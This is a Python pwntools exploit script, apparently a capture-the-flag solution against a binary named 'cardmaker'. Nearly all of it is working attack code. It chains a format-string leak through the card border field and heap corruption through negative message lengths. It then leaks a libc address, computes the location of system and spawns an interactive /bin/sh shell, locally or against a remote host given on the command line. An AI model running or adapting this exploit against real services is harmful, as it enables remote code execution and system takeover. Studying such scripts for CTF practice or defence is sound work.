#!/usr/bin/env python

from pwn import *
import sys


def create(FROM, TO, server, border, msglen, msg):
	r.sendline('1')
	r.recvuntil('Who is this card from?')
	r.sendline(FROM)
	r.recvuntil('Who is this card going to?')
	r.sendline(TO)
	r.recvuntil('send this to? (ip:port)')
	r.sendline(server)						# example 75.82.144.43:55555
	r.recvuntil('card? (max of 2 chars)')
	r.sendline(border)
	r.recvuntil('message...?')
	r.sendline(msglen)
	r.recvuntil("(end with 'done.' on its own line)")
	if msg == 'pass':
		r.send("\n")
	else:
		r.sendline(msg)
#	r.sendline('done.')
	r.recvuntil('Choice: ')

def send_all(addr):
	lr = listen(port=55555, bindaddr=addr)
	r.sendline('5')
	pause()
#	r.recvuntil('card!!!\n')
	data = lr.read(200)
	lr.close()
	return data

def list_cards(n):
	r.sendline('2')
	r.recvuntil('Which card do you want to print the fields of: ')
	r.sendline(str(n))
	r.recvuntil('Contents: ')
	leak = u64(r.recv(6).ljust(8, '\0'))
	return leak

def exploit(r):
	FROM = "AAAA"
	TO = "BBBB"
	server = "75.82.144.43:55555"	#75.82.144.43
	border = "%x"
	msglen = "100"
	msg = "done."
	create(FROM, TO, server, border, msglen, msg)
	data = send_all('192.168.1.2')
	print data
	heap = int(data[ data.index('ffff')+4:data.index('b0')+2 ], 16)
	log.info("Heap: " + hex(heap))
	stack = int(data[49 + (len(hex(heap)) % 2):58 + (len(hex(heap)) % 2)], 16)
	log.info("Stack: 0x7ff " + hex(stack)[2:])

	FROM = "AAAA"
	TO = "BBBB"
	server = "127.0.0.1:55555"	#75.82.144.43
	border = "XX"
	msglen = " -10"
	msg = "done."
	msg += "C" * 11
	msg += p64(0)
	msg += p64(0xffffffffffffffff)
	msg += p64(0)
	msg += p64(0)
	create(FROM, TO, server, border, msglen, msg)

	
	distance = heap - 0x6030b0 + 105 + 8
	FROM = "AAAA"
	TO = "BBBB"
	server = "127.0.0.1:55555"	#75.82.144.43
	border = "XX"
	msglen = " -" + str(distance)
	msg = "done."
	create(FROM, TO, server, border, msglen, msg)

	distance = 0
	FROM = "AAAA"
	TO = "BBBB"
	server = "127.0.0.1:55555"	#75.82.144.43
	border = "XX"
	msglen = " " + str(distance)
	msg = "pass"
	create(FROM, TO, server, border, msglen, msg)
	
	libc = list_cards(4)
	libc_system = libc - 0x37e808
	bin_sh = libc - 0x237a21
	log.info("Libc leak: " + hex(libc))
	log.info("System: " + hex(libc_system))

	distance = 100
	FROM = "AAAA"
	TO = "BBBB"
	server = "127.0.0.1:55555"	#75.82.144.43
	border = "XX"
	msglen = " " + str(distance)
	msg = p64(libc_system) + "\n" + "done."
	create(FROM, TO, server, border, msglen, msg)

	r.sendline('/bin/sh')

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./cardmaker'], env={'LD_PRELOAD':'libc-2.23.so'})
        print util.proc.pidof(r)
        pause()
        exploit(r)